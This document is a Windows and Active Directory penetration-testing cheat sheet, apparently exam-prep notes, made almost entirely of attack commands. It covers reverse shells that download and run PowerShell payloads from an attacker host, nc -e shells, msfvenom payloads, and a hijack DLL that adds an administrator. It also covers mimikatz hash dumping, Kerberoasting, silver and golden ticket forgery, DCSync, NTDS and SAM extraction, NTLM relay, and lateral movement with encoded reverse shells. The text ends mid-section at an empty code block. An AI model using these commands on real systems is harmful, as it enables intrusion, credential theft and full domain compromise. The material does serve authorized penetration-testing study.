
# Upgrading/Getting Shell
## Powercat
- [ ] Copy and serve `powercat.ps1` on your Kali Machine
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
```

- [ ] Set up a `nc` reverse shell listener on your Kali Machine
```
nc -nlvp 4444
```

- [ ] Download and execute a powercat reverse shell on the Target Machine
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.xxx.xxx/powercat.ps1');powercat -c 192.168.xxx.xxx -p 4444 -e cmd"
```
## Nishang
- [ ] Download and serve `Invoke-PowerShellTcp.ps1` on your Kali Machine
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python3 -m http.server 80
```

- [ ] Set up a `nc` reverse shell listener on your Kali Machine
```
nc -nlvp 4445
```

- [ ] Download and execute a nishang reverse shell on the Target Machine
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.xxx.xxx/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.xxx.xxx -Port 4445
```
## ConptyShell
- [ ] Download and serve `Invoke-ConPtyShell.ps1` on your Kali Machine
```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
python3 -m http.server 80
```

- [ ] Set up a `nc` reverse shell listener on your Kali Machine
```
nc -nlvp 4446
```

- [ ] Download and execute a ConptyShell reverse shell on the Target Machine
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.xxx.xxx/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.xxx.xxx 4446
```
```
IEX(IWR 192.168.xxx.xxx:80/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.xxx.xxx 4446
```

# Automated Windows Enumeration
## winPEAS.exe
- [ ] Copy and serve `winPEASx64.exe` on your Kali Machine
```
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `winPEASx64.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/winPEASx64.exe -Outfile winPEASx64.exe
```

- [ ] Use `winPEASx64.exe` on the Target Machine
```powershell
.\winPEASx64.exe
```
- Remember to leave exploits for last (Hold off the nuclear weapons)
## PowerUp.ps1
- [ ] Copy and serve `PowerUp.ps1` on your Kali Machine
```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `PowerUp.ps1` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/PowerUp.ps1 -Outfile PowerUp.ps1
```

- [ ] Import `PowerUp.ps1` on the Target Machine
```
powershell -ep bypass
. .\PowerUp.ps1
```

- [ ] Run all the checks in the module on the Target Machine
```
Invoke-AllChecks
```
- [More PowerUp commands](PowerUp.ps1)

# Windows Enumeration and Privilege Escalation

## Command History
- [ ] List commands entered during the current session on the Target Machine
```powershell
Get-History
```

- [ ] List path of the history file from PSReadline on the Target Machine
```powershell
(Get-PSReadlineOption).HistorySavePath
```

- [ ] List the contents of `ConsoleHost_history.txt` on the Target Machine
```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Machine Information
- [ ] List host name on the Target Machine
```
hostname
```

- [ ] List information about operating system and architecture on the Target Machine
```powershell
systeminfo
```
```powershell
Get-ComputerInfo
```

## Network Information
- [ ] List information about the TCP/IP configuration on the Target Machine
```powershell
ipconfig /all
```

- [ ] List routing table on the Target Machine
```powershell
route print
```

- [ ] List active network connections on the Target Machine
```powershell
netstat -ano
```

- [ ] Manually explore service on every port on the Target Machine
```
.\nc.exe 127.0.0.1 54321
```
- Explore the "weird" ports or "unknown" services
- Use tunneling or port forwarding if needed
## Current User
- [ ] Show username of current user on the Target Machine
```powershell
whoami
```

- [ ] Show group memberships of the current user on the Target Machine
```powershell
whoami /groups
```

- [ ] Show privileges on the Target Machine
```powershell
whoami /priv
```

### Abusing privileges
#### Printspoofer (SeImpersonatePrivilege)
- [ ] Download and serve `PrintSpoofer64.exe` on your Kali Machine
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `PrintSpoofer64.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

- [ ] Using PrintSpoofer to get an interactive PowerShell session in the context of `NT AUTHORITY\SYSTEM` on the Target Machine
```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```
#### Potatoes (SeImpersonatePrivilege)
- [ ] Download and serve GodPotato on your Kali Machine
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
```
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
```
```
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `GodPotato-NET4.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
```

- [ ] Using GodPotato's built-in Clsid for privilege escalation and command execution on the Target Machine
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

- [ ] Use GodPotato to execute a `nc` reverse shell on the Target Machine
```bash
.\GodPotato-NET4.exe -cmd "nc.exe -e C:\Windows\System32\cmd.exe 192.168.xxx.xxx 4444"
```
- Requires nc.exe

## Local Users
- [ ] Show all local users on the Target Machine
```powershell
Get-LocalUser
```
```powershell
net user
```
```
dir C:\Users
```

## Local Groups
- [ ] Show all local groups on the Target Machine
```powershell
Get-LocalGroup
```

- [ ] Show local groups of a specific user on the Target Machine
```powershell
net user hentaisalesman
```

- [ ] Show members of a specific group on the Target Machine
```powershell
Get-LocalGroupMember Administrators
```

## Files
- [ ] Recursively search for files (that may contain sensitive information) from C Drive on the Target Machine
```powershell
Get-ChildItem -Path C:\ -Include *kdbx,*log*,*config*,*.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

- [ ] Recursively list files in a cmd terminal
```cmd
cd C:\Users
dir /s
```
## Processes
- [ ] Show running processes on the Target Machine
```powershell
Get-Process
```
```powershell
Get-CimInstance -ClassName Win32_Process
```
```powershell
tasklist /v
```

- [ ] Get path of running processes on the Target Machine
```powershell
Get-Process | Select-Object Path
```

## Installed Applications
- [ ] List installed 32-bit applications in the Windows Registry on the Target Machine
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

- [ ] List installed 64-bit applications in the Windows Registry on the Target Machine
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

- [ ] List applications or scripts that are set to run automatically on boot on the Target Machine
```powershell
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

- [ ] List DCOM applications on the Target Machine
```
Get-CimInstance -ClassName Win32_DCOMApplication
```

## Service Binary Hijacking
- [ ] Show installed Windows services on the Target Machine
```powershell
Get-Service
```

- [ ] Show installed services with binary path on the Target Machine
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

- [ ] Show running services with binary path on the Target Machine
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
```powershell
Get-WmiObject -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

- [ ] Get Startup Type for specific service E.g., `mysql` on the Target Machine
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
- If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

- [ ] Show permissions of file on the Target Machine
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

## Service DLL Hijacking
- [ ] Show a list of services with spaces and missing quotes in the binary path on the Target Machine
```powershell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Where-Object {$_.PathName -notlike "*""*"} | Select-Object Name, PathName
```

- [ ] Show the PATH environment variable to view the Windows DLL search order on the Target Machine
```
$env:path
```

- [ ] Create C++ DLL binary to add a user into the administrators group on your Kali Machine
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user ezadmin password123! /add");
  	    i = system ("net localgroup administrators ezadmin /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

- [ ] Cross-Compile the C++ Code to a 64-bit DLL on your Kali Machine
```
x86_64-w64-mingw32-gcc mydll.cpp --shared -o myDLL.dll
```

- [ ] Serve the binary on your Kali Machine
```
python3 -m http.server 80
```

- [ ] Download the payload binary on the Target Machine
```
powershell iwr -uri http://192.168.xxx.xxx:80/myDLL.dll -Outfile myDLL.dll
```

- [ ] Copy the DLL to any directory that will hijack the DLL search order on the Target Machine
```
cp renamethis.exe C:\Windows\myDLL.dll
```

- [ ] Restart the service on the Target Machine
```
Restart-Service someService
```

- [ ] Check users on the Target Machine
```
net user
```

## Unquoted Service Path
- [ ] Show list of services with spaces and missing quotes in the binary path on the Target Machine
```powershell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Where-Object {$_.PathName -notlike "*""*"} | Select-Object Name, PathName
```

- [ ] Display discretionary access control list on the directory on the Target Machine
```
icacls C:\somefolder\
```

- [ ] Create a Windows executable with a non-staged TCP reverse shell payload on your Kali Machine
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=443 -f exe -o renamethis.exe
```

- [ ] Serve the binary on your Kali Machine
```
python3 -m http.server 80
```

- [ ] Download the payload binary on the Target Machine
```
powershell iwr -uri http://192.168.xxx.xxx:80/renamethis.exe -Outfile renamethis.exe
```

- [ ] Copy to an appropriate directory to hijack the unquoted service path on the Target Machine
```
cp renamethis.exe C:\somefolder\renamethis.exe
```

- [ ] Start `nc` listener on your Kali Machine
```
nc -nlvp 443
```

- [ ] Start service on the Target Machine
```
sc.exe start rektService
```

## Scheduled Tasks

- [ ] Display a list of all scheduled tasks on the Target Machine
```powershell
schtasks /query /fo LIST /v
```
- Look at "Next Run Time", "Task To Run" and "Run As User"
### Binary Hijacking
- [ ] Show permissions of file on the Target Machine
```powershell
icacls C:\schedule.ps1
```

- [ ] Show permissions on directory on the Target Machine
```powershell
icacls "C:\Program Files\Enterprise Apps"
```

## Running Process as another user

- [ ] Use `runas` to execute cmd as user (E.g., sussyadmin) on the Target Machine
```powershell
runas /user:sussyadmin cmd
```
- Does not work in a reverse shell
- Works better in GUI shell

- [ ] Run cmd as a different user with a secure string password on the Target Machine
```
$username = 'roberto'
$password = 'CaR4l0s7heM@n'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process cmd.exe -Credential $credential
```
- Output looks very broken as two shells are running concurrently
	- But it works

- [ ] Run command as a different user with a secure string password on the Target Machine
```
$username = 'roberto'
$password = 'CaR4l0s7heM@n'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process cmd.exe -Credential $credential -ArgumentList "/c whoami"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c hostname"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c ipconfig"
Start-Process cmd.exe -Credential $credential -ArgumentList "/c type C:\Users\Administrator\Desktop\proof.txt"
```
- Specify the parameter `/c` or `/k` to carry out the command
- You may use this to execute a `nc` reverse shell
	- `Start-Process cmd.exe -Credential $credential -ArgumentList "/c nc.exe 192.168.xx.xxx 4445 -e cmd.exe"`

## Rogue authentication server

- [ ] Start `responder` to answer to File Server Service request for SMB on our Kali Machine to capture user's Net-NTLMv2 hash
```
sudo responder -I tun0 -v
```

- [ ] Create an SMB connection to our Kali Machine
```cmd
\\192.168.xxx.xxx\test
```

- [ ] Crack the hashes on your Kali Machine or use for PtH

## Relaying Net-NTLMv2

- [ ] Start `impacket-ntlmrelayx` to relay the authentication part of an incoming SMB connection targeting the machine with a base64 encoded PowerShell reverse shell one-liner on our Kali Machine
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.yyy.yyy -c "powershell -enc <encoded_reverse_shell_payload>"
```
-  `-t` to set the IP of Target Machine

- [ ] Start `nc` listener on our Kali Machine
```
nc -nvlp 8080
```

- [ ] Create a SMB connection from the Target Machine to our Kali Machine
```
dir \\192.168.xxx.xxx\test 
```

- [ ] Get reverse shell

# Post Privilege Escalation Looting
## WinPEAS

- [ ] Run `winPEAS.exe` again on the Target Machine
```powershell
.\winPEAS.exe
```
- Try to find passwords, command history, view files that non-admins cannot
## NTLM Hashes
### Mimikatz
#### Hashes
- [ ] Copy and serve `mimikatz.exe` on your Kali Machine
```
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `mimikatz.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/mimikatz.exe -Outfile mimikatz.exe
```

- [ ] Dump NTLM hashes from SAM on the Target Machine
```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

- [ ] Dump hashes of all logged-on users stored in LSASS including cached hashes on the Target Machine
```
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

- [ ] Dump saved credentials in the Windows Vault on the Target Machine
```
.\mimikatz.exe
privilege::debug
token::elevate
vault::list
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "vault::list" "exit"
```

- [ ] Dump hashes from memory from LSASS.exe (LSA server) on the Target Machine
```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::lsa /patch
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" "exit"
```

- [ ] Crack the hashes on your Kali Machine or use for PtH
#### Over Pass the Hash
- [ ] Creating a process as another user by passing the hash on the Target Machine
```
sekurlsa::pth /user:salesman /domain:hentai.com /ntlm:9b4cc9df64653763798290efd18e3175 /run:powershell
```

- [ ] List Kerberos tickets as that user, on the Target Machine
```
klist
```

- [ ] Generate a TGT by authenticating to a network share as that user, on the Target Machine
```
net use \\files69
```
- Any command that requires domain permissions would subsequently create a TGS
- In essence, this turns an NTLM hash into a Kerberos ticket and avoids the use of NTLM authentication
- We may reuse the TGT

- [ ] List the newly requested Kerberos tickets on the Target Machine
```
klist
```

- [ ] Get remote access to new target machine, on the Target Machine
```
.\PsExec.exe \\web69 cmd
```
- Launches `cmd` remotely on the `\\web69` machine as that user
- Download from SysinternalsSuite
#### Kerberos Tickets
- [ ] Export Kerberos tickets stored in memory, on the Target Machine
```
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::tickets /export
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
```

- [ ] Verify newly exported Kerberos tickets on the Target Machine
```
dir *.kirbi
```

- [ ] Inject selected TGS into process memory on the Target Machine
```
kerberos::ptt [0;12bd0]-0-0-40690000-salesman@cifs-web69.kirbi
```

- [ ] Launch a new command prompt on the Target Machine
```
misc::cmd
```

- [ ] Delete any existing Kerberos tickets on the Target Machine
```
kerberos::purge
```
#### Forging Silver Ticket
- [ ] Obtain NTLM hash of the service account

- [ ] Obtain the domain SID on the Target Machine
```powershell
whoami /user
```
- Remove the last part of the SID

- [ ] Obtain target SPN on the Target Machine
```powershell
web69.hentai.com
```

- [ ] Forge the service ticket with any domain user (E.g., hentaiadmin) and inject into the current session, on the Target Machine
```powershell
kerberos::golden /sid:S-1-5-21-1736980270-669058905-1784818369 /domain:hentai.com /ptt /target:web69.hentai.com /service:http /rc4:42128cf5d1319520484caa252d399609 /user:hentaiadmin
```

- [ ] Confirm that ticket is ready to use in memory, on the Target Machine
```powershell
klist
```

- [ ] Access the SMB share with the silver ticket as chosen user (E.g., hentaiadmin), on the Target Machine
```powershell
iwr -UseDefaultCredentials http://web69
```
#### Domain Controller Synchronization

- [ ] Obtain access as a member of either the Domain Admins, Enterprise Admins, and Administrators, on the Target Machine

- [ ] Obtain NTLM hash of domain user by impersonating a domain controller using replication, on the Target Machine
```powershell
.\mimikatz.exe
lsadump::dcsync /user:hentai\salesman
```
#### Forging Golden Ticket
- [ ] Obtain NTLM hash of the krbtgt account by RDP-ing into the domain controller with a privileged account, on the Target Machine
```powershell
.\mimikatz.exe
privilege::debug
lsadump::lsa /patch
```

- [ ] Obtain the domain SID on the Target Machine
```powershell
whoami /user
```
- Remove the last part of the SID

- [ ] Create golden ticket on any machine on any user, deleting any existing Kerberos tickets and launch a new command prompt, on the Target Machine
```powershell
kerberos::purge
kerberos::golden /user:salesman /domain:hentai.com /sid:S-1-5-21-1736980269-669056969-1784818369 /krbtgt:182cd1c7afffc7af11ef346fef693c69 /ptt
misc::cmd
```
- Creating the golden ticket and injecting it into memory does not require any administrative privileges
- Can be performed from a computer that is not joined to the domain.

- [ ] Attempt lateral movement on the newly spawned command prompt on the Target Machine
```powershell
PsExec.exe \\Dc1 cmd.exe
```
- DO NOT connect with the IP address of the domain
	- This forces the use of NTLM authentication and access would still be blocked
### Shadow Copies

- [ ] Extract the NTDS database to the C drive on the Target Machine
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\Tools\ntds.dit.bak
```

- [ ] Extract the SYSTEM hive from the Windows registry on the Target Machine
```powershell
reg.exe save hklm\system c:\system.bak
```

- [ ] Transfer the files back to your Kali Machine

- [ ] Extract NTLM hashes and Kerberos keys for every AD user on your Kali Machine
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

- [ ] Crack the hashes on your Kali Machine or use for PtH
### SAM and SYSTEM registry hives

- [ ] Get SYSTEM and SAM hives via registry on the Target Machine
```powershell
reg save hklm\system SYSTEM
reg save hklm\sam SAM
reg save hklm\security SECURITY
```

- [ ] Alternatively, get SYSTEM and SAM hives directly on the Target Machine
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```
- Usually doesn't work because its being used

- [ ] Transfer the files back to your Kali Machine

- [ ] Extract NTLM hashes for local users on your Kali Machine
```bash
/usr/share/creddump7/pwdump.py SYSTEM SAM
```
```bash
impacket-secretsdump -system SYSTEM LOCAL -sam SAM 
```
```bash
samdump2 SYSTEM SAM
```
- samdump2 usually doesnt work and gives the same hash for every user

- [ ] Crack the hashes on your Kali Machine or use for PtH

# Automated Active Directory Enumeration
## adPEAS.ps1

- [ ] Download and serve `adPEAS.ps1` on your Kali Machine
```bash
wget https://github.com/61106960/adPEAS/blob/main/adPEAS.ps1
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `adPEAS.ps1` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/adPEAS.ps1 -Outfile adPEAS.ps1
```

- [ ] Import `adPEAS.ps1` on the Target Machine
```powershell
powershell -ep bypass
. .\adPEAS.ps1
```

- [ ] Use `adPEAS.ps1` on the Target Machine
```powershell
Invoke-adPEAS
```

## PowerView.ps1

- [ ] Copy and serve `PowerView.ps1` on your Kali Machine
```bash
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `PowerView.ps1` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/PowerView.ps1 -Outfile PowerView.ps1
```

- [ ] Import `PowerView.ps1` on the Target Machine
```powershell
powershell -ep bypass
. .\PowerView.ps1
```

### Domain information
- [ ] List domain information on the Target Machine
```powershell
Get-NetDomain
```

- [ ] List the domain controllers for the current or specified domain on the Target Machine
```powershell
Get-NetDomainController
```

- [ ] List domain computer objects on the Target Machine
```powershell
Get-NetComputer
```
```powershell
Get-NetComputer | select samaccountname, dnshostname, operatingsystem, operatingsystemversion
```

- [ ] List IP address of domain computer (E.g., web69) on the Target Machine
```powershell
Resolve-IPAddress -ComputerName web69
```
- pinging hostname may work as well
### Domain shares
- [ ] List domain shares on the Target Machine
```powershell
Find-DomainShare
```

- [ ] List domain shares available to us on the Target Machine
```powershell
Find-DomainShare -CheckShareAccess
```
### Domain users
- [ ] List all domain user accounts on the Target Machine
```powershell
Get-NetUser
```
```powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```

- [ ] List all domain SPN accounts on the Target Machine
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### Domain users
- [ ] List all domain groups on the Target Machine
```powershell
Get-NetGroup | select cn
```

- [ ] Show members of domain group E.g., "Sales Department" on the Target Machine
```powershell
Get-NetGroup "Sales Department" | select member
```

- [ ] Change user password (E.g., sussyman) on the Target Machine
```powershell
$UserPassword = ConvertTo-SecureString 'P@ssw0rd69' -AsPlainText -Force
Set-DomainUserPassword -Identity sussyman -AccountPassword $UserPassword
```
- Current user needs GenericAll access on that user

- [ ] List logged on users (active sessions) on local (or remote) machine (E.g., files69) on the Target Machine
```powershell
Get-NetSession -ComputerName files69 -Verbose
```
- Not accurate

- [ ] List logged on users (active sessions) on all domain controllers on the Target Machine
```powershell
Get-DomainController | Get-NetSession
```
- Not accurate

- [ ] List domain machines where the current user has local administrator access on the Target Machine
```powershell
Find-LocalAdminAccess
```
- Doesn't always work, and takes a long time
- Using crackmapexec usually yields better results
### Access Control List
- [ ] List the ACEs applied to user (E.g., salesman) on the Target Machine
```powershell
Get-ObjectAcl -Identity salesman
```
- Access Control Entries (ACE) make up the Access Control List (ACL)
	- Defines whether access to the specific object is allowed or denied.

- [ ] List ACLs for group (E.g., Sales Department) on the Target Machine
```powershell
Get-ObjectAcl -Identity "Sales Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

- [ ] List object ACLs in the current (or specified) domain with modification rights set to non-built in objects on the Target Machine
```powershell
Find-InterestingDomainAcl
```
### Kerberoasting
- [ ] Request service tickets for kerberoastable accounts on the Target Machine
```
Invoke-Kerberoast
```
### Converting SIDs
- [ ] Convert SID into name on the Target Machine
```powershell
Convert-SidToName S-1-5-21-1269873700-690595805-1743818869-1140
```
```powershell
"S-1-5-21-1269873700-690595805-1743818869-1140","S-1-5-21-1269873700-690595805-1743818869-1069","S-1-5-32-548","S-1-5-18","S-1-5-21-1269873700-690595805-1743818869-1169" | Convert-SidToName
```

## SharpHound

- [ ] Download and serve `SharpHound.exe` on your Kali Machine
```
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
python3 -m http.server 80
```
- `SharpHound.ps1` didn't work as well

- [ ] Use the iwr cmdlet to download `SharpHound.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/SharpHound.exe -Outfile SharpHound.exe
```

- [ ] Run `SharpHound.exe` on the Target Machine
```
./SharpHound.exe --CollectionMethods All
```

- [ ] Transfer the `XXXXXXXXXXXXXX_BloodHound.zip` back to your Kali Machine

- [ ] Start `neo4j` database and bloodhound on your Kali Machine
```
sudo neo4j start
bloodhound
```

- [ ] Use Upload Data function on the right side of the GUI to upload the zip file on your Kali Machine

- [ ] View BloodHound Analysis on your Kali Machine
```
E.g.,
Find all Domain Admins
Find Shortest Paths to Domain Admins
Shortest Paths to Domain Admins from Owned Principals
```
- Right-click the line between the nodes between user and machine and click _? Help_, BloodHound to show additional information
	- View Abuse info
- Right-click pwned users and click "Mark as Owned"
	- Re-run analysis

- [ ] Use custom bloodhound query to display all computers on your Kali Machine
```
MATCH (m:User) RETURN m
```

- [ ] Use custom bloodhound query to display all active sessions on your Kali Machine
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

## Rebeus

- [ ] Download and serve `Rubeus.exe` on your Kali Machine
```
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
python3 -m http.server 80
```

- [ ] Use the iwr cmdlet to download `Rubeus.exe` on the Target Machine
```powershell
powershell iwr -uri http://192.168.xxx.xxx:80/Rubeus.exe -Outfile Rubeus.exe
```
### AS-REP Roasting
- [ ] Use `Rubeus.exe` to get the AS-REP hash on the Target machine
```
.\Rubeus.exe asreproast /nowrap
```
- Get user password hashes that "Do not require Kerberos preauthentication"
### Kerberoasting
- [ ] Use `Rubeus.exe` to get the TGS-REP hash on the Target machine
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- Get service account password hashes
### Over Pass the Hash
- [ ] Use `Rubeus.exe` to get the TGT on the Target machine
```
.\Rubeus.exe asktgt /domain:hentai.com /user:sussygirl /ntlm:364933f79b1246e075243cc66de609bf /ptt
```

## Invoke-Kerberoast.ps1
### Kerberoasting
- [ ] Download and serve `Invoke-Kerberoast.ps1` on your Kali Machine
```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
python3 -m http.server 80
```

- [ ] Import `Invoke-Kerberoast.ps1` on the Target Machine
```
. .\Invoke-Kerberoast.ps1
```

- [ ] Request service tickets for kerberoastable accounts on the Target Machine
```
Invoke-Kerberoast -Domain hentai.com -OutputFormat Hashcat | fl
```

- [ ] Crack the hashes on your Kali Machine or use for PtH

## Impacket
### AS-REP Roasting
- [ ] Use `impacket-GetNPUsers` to get the AS-REP hash from your Kali Machine
```
impacket-GetNPUsers -dc-ip 192.168.yyy.yyy -request -outputfile hashes.asreproast hentai.com/salesboy
```
- Get user password hashes that "Do not require Kerberos preauthentication"
### Kerberoasting
- [ ] Use `impacket-GetUserSPNs` to get the TGS-REP hash from your Kali Machine
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.yyy.yyy hentai.com/salesboy
```
- Get service account password hashes
### Domain Controller Synchronization
- [ ] Use `impacket-secretsdump` to request NTLM hash of users by impersonatng a domain controller using replication from your Kali Machine
```
impacket-secretsdump -just-dc-user salesman hentai.com/sussyadmin:"BrahdoyouGotanythetissues6969\!"@192.168.yyy.yyy
```
### Remote NTLM extraction
- [ ] Remotely Get NTLM hashes on the Domain Controller with credentials from your Kali Machine
```bash
impacket-secretsdump -just-dc-ntlm domain/user:password@IP
```
```bash
impacket-secretsdump -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH
```
- Works only on DC machine

# Active Directory Enumeration

- [ ] Show the account policy on the Target machine
```
net accounts
```
```
Get-ADDefaultDomainPasswordPolicy
```

Run command prompt as user (E.g., "slightlysusadmin") on the Target Machine
```
runas /netonly /user:somedomain\slightlysusadmin cmd
```

References
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/

# Active Directory Lateral Movement

## wmic
- [ ] Spawn a process (UTF16 encoded reverse shell payload) on a remote system using the wmic command-line utility on the Target Machine
```cmd
wmic /node:192.168.yyy.yyy /user:salesman /password:Sussy123! process call create 'powershell -nop -w hidden -e <encoded_reverse_shell_payload>'
```

## WinRS
- [ ] Using `winrs` to execute remote commands (UTF16 Encoded PowerShell reverse-shell payload) on the Target Machine
```cmd
winrs -r:files69 -u:salesman -p:Sussy123!  "powershell -nop -w hidden -e <encoded_reverse_shell_payload>"
```
- Domain user needs to be part of the Administrators or Remote Management Users group on the target host

## PowerShell Remote Session
- [ ] Establish a PowerShell Remote Session via WinRM on the Target Machine
```powershell
$username = 'salesman';
$password = 'Sussy365!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.yyy.yyy -Credential $credential
```

## Common Information Model Session
- [ ] Create the PSCredential object in PowerShell on the Target Machine
```powershell
$username = 'salesman';
$password = 'Sussy365!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

- [ ] Create a new CimSession with a UTF16 encoded reverse shell payload on the Target Machine
```powershell
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.yyy.yyy -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e <encoded_reverse_shell_payload>';
```
- New-CimSession to create a Common Information Model (CIM)
- DCOM as the protocol for the WMI session
- You can change $Command to run other things if needed E.g., calc:
	- `$command = 'calc';`

- [ ] Invoke the WMI session through PowerShell on the Target Machine
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## PsExec64.exe
- [ ] Start an interactive session on the Target Machine
```powershell
./PsExec64.exe -i  \\WEB69 -u hentaidomain\salesman -p Sussy365! cmd
```

## evil-winrm
- [ ] Get fully-interactive shell access from your Kali Machine
```bash
